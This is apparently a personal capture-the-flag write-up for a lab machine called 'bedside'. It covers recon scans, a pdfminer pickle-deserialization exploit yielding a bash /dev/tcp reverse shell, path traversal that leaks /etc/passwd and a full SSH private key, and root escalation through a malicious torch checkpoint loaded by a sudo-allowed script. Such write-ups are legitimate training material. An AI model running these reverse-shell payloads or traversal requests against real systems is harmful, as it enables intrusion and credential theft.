### Nmap
```
nmap -sV -sC -vv 10.129.58.73

---OUTPUT---
Nmap scan report for 10.129.58.73
Host is up, received echo-reply ttl 63 (0.016s latency).
Scanned at 2026-07-22 04:31:11 EDT for 10s
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE REASON         VERSION
22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    syn-ack ttl 63 Apache httpd 2.4.68
|_http-server-header: Apache/2.4.68 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://bedside.htb/
3000/tcp filtered ppp     no-response
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![[Pasted image 20260722043307.png]]

### Gobuster:

```
gobuster dir -u http://bedside.htb \                                
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt           
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bedside.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
javascript           (Status: 301) [Size: 355] [--> http://bedside.htb/javascript/]
```

### Ffuf
```
ffuf -u http://bedside.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.bedside.htb" -fw 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 21
________________________________________________

Research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 19ms]
research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 16ms]
:: Progress: [20481/20481] :: Job [1/1] :: 3030 req/sec :: Duration: [0:00:09] :: Errors: 0 ::

```

- We find a subdomain research and Research
![[Pasted image 20260722043726.png]]

- I upload a test document and in BurpSuite I see the server is user pdfminer.six to take in the document.
![[Pasted image 20260722061444.png]]

- Looking online I see there is a vulnerability for thiscausing code execution: https://github.com/advisories/GHSA-wf5f-4jwr-ppcp
- I tried following that which gave me most of the information howeer the pdf info to add was not complete so I ended up using a PoC instead (which helpe dme identify why ): https://github.com/BardLaudian/CVE-2025-64512
```
python3 gen_payload.py \                                                                
  --path "/var/www/research.bedside.htb/uploads/payload" \
  --command "bash -c 'bash -i >& /dev/tcp/10.10.16.9/9999 0>&1'" \
  --pdf-out trigger.pdf \
  --gz-out payload.pickle.gz
[+] Trigger PDF written to:    trigger.pdf
[+] Pickle payload written to: payload.pickle.gz
[+] On the target, the pickle payload MUST end up saved at:
      /var/www/research.bedside.htb/uploads/payload.pickle.gz
[+] Command that will run when the PDF is processed: bash -c 'bash -i >& /dev/tcp/10.10.16.9/9999 0>&1'
```

- I then upload the 2 files:
```
curl -s -F "uploadFile=@payload.pickle.gz" http://research.bedside.htb | grep -i message

--AND--
curl -s -F "uploadFile=@trigger.pdf" http://research.bedside.htb | grep -i message

---OUTPUT-1-AND-2---
.message { margin-top:1rem; font-weight:bold; color:#1b6d3f; }
<div class="message">File uploaded successfully: payload.pickle.gz</div>

.message { margin-top:1rem; font-weight:bold; color:#1b6d3f; }
<div class="message">File uploaded successfully: trigger.pdf</div>
```

- I get a shell on my netcat listener:
![[Pasted image 20260722111532.png]]

- Looking around I dont find a user file. Furthermore checking with `ls -la /.dockerenv` proves its in a container.


- I check mount files and see there is a shared folder with the main machine:
```
mount

---RELEVANT-OUTPUT---

/dev/sda4 on /datastore type ext4 (rw,relatime,errors=remount-ro)
/dev/sda4 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda4 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda4 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
/dev/sda4 on /var/www/research.bedside.htb/uploads type ext4 (rw,relatime,errors=remount-ro)
```

- Checking `/datastore` I see some interesting files.

- I create a ligolo tunnel :
```
---LOCAL-MACHINE---
./proxy -selfcert -laddr 0.0.0.0:9000
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo

---ON-TARGET---
./agent -connect 10.10.16.9:9000 -ignore-cert

---ON-LOCAL-AGAIN-LIGOLO SESSION--
session
> 1
> start
```
![[Pasted image 20260723111249.png]]

- I do an nmap scan and see port 3000 is open:
```
nmap -sV -sC -vv 240.0.0.1

---OUTPUT---
Nmap scan report for 240.0.0.1
Host is up, received reset ttl 64 (0.020s latency).
Scanned at 2026-07-22 09:41:05 EDT for 35s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.68
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://bedside.htb/
|_http-server-header: Apache/2.4.68 (Debian)
3000/tcp open  http    syn-ack ttl 64 Golang net/http server
|_http-title: Bedside Clinic - Image Viewer
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, must-revalidate
|     Content-Type: text/html; charset=utf-8
|     Etag: w/"1762804009713-3445-136"
|     Date: Wed, 22 Jul 2026 13:41:13 GMT
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Bedside Clinic - Image Viewer</title>
|     <style>
|     body {
|     font-family: 'Segoe UI', sans-serif;
|     background-color: #f4f9fc;
|     color: #0b3d91;
|     margin: 0;
|     padding: 20px;
|     text-align: center;
|     color: #0b3d91;
|     #root {
|     display: flex;
|     flex-direction: column;
|     align-items: center;
|     .viewer {
|     display: flex;
|     flex-direction: column;
|     align-items: center;
|     margin-top: 20px;
|     .mask-grid {
|     display: grid;
|     grid-template-columns: repeat(5, 40px);
|     gap: 2px;
|     margin-top: 10px;
|     .cell {
|_    width: 40px;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=7/22%Time=6A60C878%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,F39,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20max-age=0,\x20must-revalidate\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nEtag:\x20w/\"1762804009713-3445-136\"\r\nDate:\x20Wed,\x20
SF:22\x20Jul\x202026\x2013:41:13\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20<t
SF:itle>Bedside\x20Clinic\x20-\x20Image\x20Viewer</title>\n\x20\x20<style>
SF:\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20font-family:\x20'S
SF:egoe\x20UI',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20background-color:\
SF:x20#f4f9fc;\n\x20\x20\x20\x20\x20\x20color:\x20#0b3d91;\n\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20padding:\x2020px;\n\x2
SF:0\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20text
SF:-align:\x20center;\n\x20\x20\x20\x20\x20\x20color:\x20#0b3d91;\n\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20#root\x20{\n\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\n\x20\
SF:x20\x20\x20\x20\x20align-items:\x20center;\n\x20\x20\x20\x20}\n\n\x20\x
SF:20\x20\x20\.viewer\x20{\n\x20\x20\x20\x20\x20\x20display:\x20flex;\n\x2
SF:0\x20\x20\x20\x20\x20flex-direction:\x20column;\n\x20\x20\x20\x20\x20\x
SF:20align-items:\x20center;\n\x20\x20\x20\x20\x20\x20margin-top:\x2020px;
SF:\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.mask-grid\x20{\n\x20\x20\x20\x
SF:20\x20\x20display:\x20grid;\n\x20\x20\x20\x20\x20\x20grid-template-colu
SF:mns:\x20repeat\(5,\x2040px\);\n\x20\x20\x20\x20\x20\x20gap:\x202px;\n\x
SF:20\x20\x20\x20\x20\x20margin-top:\x2010px;\n\x20\x20\x20\x20}\n\n\x20\x
SF:20\x20\x20\.cell\x20{\n\x20\x20\x20\x20\x20\x20width:\x2040px;\n\x20\x2
SF:0\x20\x20\x20")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(HTTPOptions,F39,"HTTP/1\.0\x20200\x20OK\r\nCa
SF:che-Control:\x20max-age=0,\x20must-revalidate\r\nContent-Type:\x20text/
SF:html;\x20charset=utf-8\r\nEtag:\x20w/\"1762804009713-3445-136\"\r\nDate
SF::\x20Wed,\x2022\x20Jul\x202026\x2013:41:13\x20GMT\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"UTF-8\"
SF:>\n\x20\x20<title>Bedside\x20Clinic\x20-\x20Image\x20Viewer</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20font-
SF:family:\x20'Segoe\x20UI',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#f4f9fc;\n\x20\x20\x20\x20\x20\x20color:\x20#0b3d91;\n\
SF:x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20padding:\
SF:x2020px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x2
SF:0\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20color:\x20#0b3
SF:d91;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20#root\x20{\n\x20\x20\x20\x20
SF:\x20\x20display:\x20flex;\n\x20\x20\x20\x20\x20\x20flex-direction:\x20c
SF:olumn;\n\x20\x20\x20\x20\x20\x20align-items:\x20center;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20\.viewer\x20{\n\x20\x20\x20\x20\x20\x20display:\
SF:x20flex;\n\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\n\x20\x20\
SF:x20\x20\x20\x20align-items:\x20center;\n\x20\x20\x20\x20\x20\x20margin-
SF:top:\x2020px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.mask-grid\x20{\n\
SF:x20\x20\x20\x20\x20\x20display:\x20grid;\n\x20\x20\x20\x20\x20\x20grid-
SF:template-columns:\x20repeat\(5,\x2040px\);\n\x20\x20\x20\x20\x20\x20gap
SF::\x202px;\n\x20\x20\x20\x20\x20\x20margin-top:\x2010px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20\.cell\x20{\n\x20\x20\x20\x20\x20\x20width:\x204
SF:0px;\n\x20\x20\x20\x20\x20");
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I browse the port on the browser which gives an image viwewer tab but basically a blank screen
- Testing it with BurpSuite shows an LFI vulnerability but accessing `/etc/passwd`:
![[Pasted image 20260722112033.png]]

```
--_REQUEST---
GET /../../../../../../etc/passwd HTTP/1.1
Host: 240.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

---RESPONSE---
HTTP/1.1 200 OK
Cache-Control: max-age=0, must-revalidate
Content-Type: application/octet-stream
Etag: w/"1780110289405-1328-136"
Date: Wed, 22 Jul 2026 13:42:30 GMT
Content-Length: 1328

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```
- I identify user `developer` and use it to grab the ssh key:
![[Pasted image 20260722112102.png]]

```
---REQUEST---
GET /../../../../../../home/developer/.ssh/id_rsa HTTP/1.1
Host: 240.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

---RESPONSE---
HTTP/1.1 200 OK
Cache-Control: max-age=0, must-revalidate
Content-Type: application/octet-stream
Etag: w/"1762737401212-411-136"
Date: Wed, 22 Jul 2026 13:44:05 GMT
Content-Length: 411

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
- Key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

- I copy it to my local machine, set the right permissions and use it to log on to the target:
```
chmod 0600 dev.rsa
ssh -i dev.rsa developer@bedside.htb
```
![[Pasted image 20260722112229.png]]

- I grab the user flag:
![[Pasted image 20260722113354.png]]

### Privilege Escalation
- I check sudo privileges and it leads to a python code:
```
sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

![[Pasted image 20260722113450.png]]

- Reading the code there are 2 main sections to look at :
```
----SECTION-1---
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
start_epoch = 0
if latest_ckpt:
    logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    ...
    loader(engine)  # invoke the handler directly
    
    
---SECTION-2---
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None
```
- find_latest_checkpoint() trusts file mtime, not identity or origin. It globs *.pt in CHECKPOINT_DIR and picks whichever has the newest modification time — no signature check, no allowlist of known-good checkpoint names, no ownership check. Anyone who can write a .pt file into that directory (with a newer mtime than existing ones) controls which file gets loaded next.
- CheckpointLoader (from monai.handlers) wraps torch.load() internally, which — on torch < 2.6, or whenever weights_only isn't explicitly forced to True — uses Python's pickle module to deserialize the file. Pickle deserialization is not safe against untrusted input: any object implementing __reduce__ can specify an arbitrary callable and arguments to invoke during unpickling itself, before any application logic (like reading model/optimizer keys) ever runs.

- The privilege boundary is the real amplifier. This code path is reached via:
```

   User developer may run the following commands on bedside:
       (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```
- So a low-privilege file write (into a directory the attacker can reach) turns into arbitrary code execution as root the moment developer invokes the permitted sudo command — because the deserialization happens inside the privileged process, not the attacker's own.

-  The root cause, in short: untrusted-file deserialization (torch.load/pickle) triggered by a name/mtime-based file selection, running with elevated privileges. The same pattern as your pdfminer/pickle bug earlier in this box — pickle deserialization is being trusted implicitly wherever it shows up here.   

- Now to implement the main exploit.
- On the target host (not container) we can run python (maybe we can do this locally too). So I can crete my payload using the torch vulnerbaility to create a reverse shell with the following command:
```
python3 << 'EOF'
import torch, os

class RCE:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'"
        return (os.system, (cmd,))

torch.save(RCE(), "checkpoint_epoch_999.pt")
EOF
```

- Then send it to the container:
```
---HOST-PYTHON-SERVER-ON-TARGET-HOST---
python3 -m http.server 9898

---CONTAINER--
curl http://localhost:9898/checkpoint_epoch2_999.pt -O /datastore/checkpoints/checkpoint_epoch2_999.pt
curl http://localhost:9898/checkpoint_epoch2_999.pt -O /datastore/checkpoints/checkpoint_epoch2_999.pt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   984  100   984    0     0   155k      0 --:--:-- --:--:-- --:--:--  160k
curl: (3) URL rejected: No host part in the URL
```
![[Pasted image 20260723061857.png]]
- Initially when running the sudo command here it failed with an error never reaching my payload. The error seemed to be stemming from the a problem at the build.model() step which checks /`/datastore/processed` and found txt files instead of an image.
- To fix this we create a minimal PNG file and move it to `/datastore/processed` and delete all the text files:
- Creating minimal PNG with pytho on target host:
```
python3 -c "
from PIL import Image
img = Image.new('RGB', (64, 64), color='white')
img.save('/tmp/valid.png')
"

```
- Sent to container the same way as before
```
----ON-CONTAINER---
cd /datastore/processed
rm *.txt
```
- Finally run the command we have sudo privileges for:
```
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

---OUTPUT---
2026-07-22 15:16:18,586 | INFO | Device: cpu
2026-07-22 15:16:18,588 | INFO | Using 1 samples for training.
2026-07-22 15:16:18,644 | INFO | Auto-detected input features: 12288
2026-07-22 15:16:18,659 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_999.pt, loading with CheckpointLoader (callable mode)...
```

![[Pasted image 20260723062040.png]]

- I grab a shell on my listener as root:
![[Pasted image 20260723062136.png]]

- grab the root flag in root home directory:
![[Pasted image 20260723062222.png]]

### Same PE Exploit, different way to get root shell:
- The other way would be to edit the bash file to have the SUID bit. I am sharing this as I found something interesting. First I tried to execute this such that the bash fil with modified privileges would be saved to `/tmp` folder:
```
python3 << 'EOF'
import torch, os

class RCE:
    def __reduce__(self):
        cmd = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
        return (os.system, (cmd,))

torch.save(RCE(), "checkpoint_epoch2_999.pt")
EOF
```
- After uploading the PNG and removing the text files we run the sudo command the user `developer` has privileges to:
```
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

---OUTPUT---
2026-07-22 15:16:18,586 | INFO | Device: cpu
2026-07-22 15:16:18,588 | INFO | Using 1 samples for training.
2026-07-22 15:16:18,644 | INFO | Auto-detected input features: 12288
2026-07-22 15:16:18,659 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch2_999.pt, loading with CheckpointLoader (callable mode)...
```

- However when running `/tmp/rootbash -p` we don't get a root shell.
![[Pasted image 20260723091357.png]]

- Checking permissions we see SUID bit isnt carried over:
![[Pasted image 20260723091444.png]]

![[Pasted image 20260723091503.png]]

- Ons earching for a bit I find that `/tmp` directory has nosuid in the findmnt output:
![[Pasted image 20260723091538.png]]
```
findmnt -no OPTIONS /tmp

---OUTPUT---
rw,nosuid,nodev,size=1988580k,nr_inodes=1048576,inode64
```

- So alternatively we can run the same command but set the directory to one that doesnt have this `nosuid` set. This could be `/var/tmp` location:
```
cat > /tmp/mkckpt.py << 'PYEOF'
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ("cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash",))
torch.save({"model": Evil()}, "/tmp/checkpoint_epoch_999.pt")
PYEOF
```
- Run the command:
```
python3 /tmp/mkckpt.py
```
- it will generate the file which we place in checkpoints directory in the container
- Finally once the file is placed and the png is in the required folder, we can pass the sud command again:
```
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

---OUTPUT---
2026-07-22 15:27:25,869 | INFO | Device: cpu
2026-07-22 15:27:25,870 | INFO | Using 1 samples for training.
2026-07-22 15:27:25,924 | INFO | Auto-detected input features: 12288
2026-07-22 15:27:25,937 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_999.pt, loading with CheckpointLoader (callable mode)...
```
- The new bash file  with the SUID bit should be in the `/var/tmp` folder:
![[Pasted image 20260723091857.png]]

- We run the bash ccommand with a persisting shell to gain root access:
```
cd /var/tmp
./rootbash -p
```
![[Pasted image 20260723091935.png]]